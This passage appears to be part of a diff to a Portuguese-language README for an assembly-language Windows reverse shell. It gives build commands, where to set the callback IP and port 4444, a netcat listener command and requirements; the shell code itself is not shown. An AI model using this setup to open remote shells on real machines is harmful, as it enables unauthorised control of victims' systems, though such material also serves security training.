@@ -20,3 +20,30 @@ Shell reverso básico utilizando Winsock2 e CreateProcess.
 ```bash
 nasm -f win64 shell.asm -o shell.obj
 link /SUBSYSTEM:CONSOLE shell.obj ws2_32.lib /OUT:shell.exe
+```
+
+## Configuração
+
+*    IP: Linha 25 (192.168.1.100)
+*    Porta: Linha 26 (4444)
+
+## Listener
+
+```
+nc -lvnp 4444
+
+```
+## Requisitos
+
+
+*    NASM (Netwide Assembler)
+*    Windows SDK (ML64 ou MSVC Linker)
+*    Windows 10 x64
+
+### Autor
+
+Éden Zafire
+
+
+
+
